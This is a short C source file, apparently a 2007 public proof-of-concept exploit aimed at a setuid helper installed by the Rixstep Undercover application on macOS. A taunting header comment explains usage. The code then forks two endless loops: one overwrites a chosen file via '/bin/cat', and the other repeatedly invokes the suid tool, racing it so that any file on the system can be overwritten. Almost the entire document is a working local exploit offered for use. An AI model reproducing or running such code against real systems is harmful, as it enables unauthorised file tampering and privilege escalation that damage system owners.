/*
 * "It may not come as a shocker, but so far the Month of Rixstep Bugs has not netted a single bug."
 * -- http://rixstep.com/1/20070115,00.shtml
 *
 * Maybe because nobody was looking?
 * Here's a nice little exploit to overwrite any file on the system courtesy of
 * Rixstep.
 *
 * Just run Undercover <ftp://rixstep.com/pub/Undercover.tar.bz2> once as an
 * administrator to create that nice little suid-tool.
 * Then run this app giving the path to the uc tool (Undercover.app/Contents/Resources/uc)
 * a file you want to overwrite, and the file the data to overwrite with is
 * located at.
 *
 * The pwnies aren't just for everyone else Rixstep.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main (int argc, char *argv[])
{ 
    pid_t pid;
    char *overwrite_cmd, *uc_cmd;
    if(argc != 4) { 
        fprintf(stderr, "rixstep_pwnage.c\n");
        fprintf(stderr, "Usage: %s <uc tool path> <file to overwrite> <source file>\n", argv[0]);
        return 1;
    }
    
    asprintf(&overwrite_cmd, "/bin/cat %s > %s", argv[3], argv[2]);
    asprintf(&uc_cmd, "%s + %s", argv[1], argv[2]);
    
    pid = fork();
    if(pid == 0)
    {
        for (;;) {
            system(overwrite_cmd);
        }
    }
    if(pid > 0)
    {
        for (;;) {
            system(uc_cmd);
        }
    }
}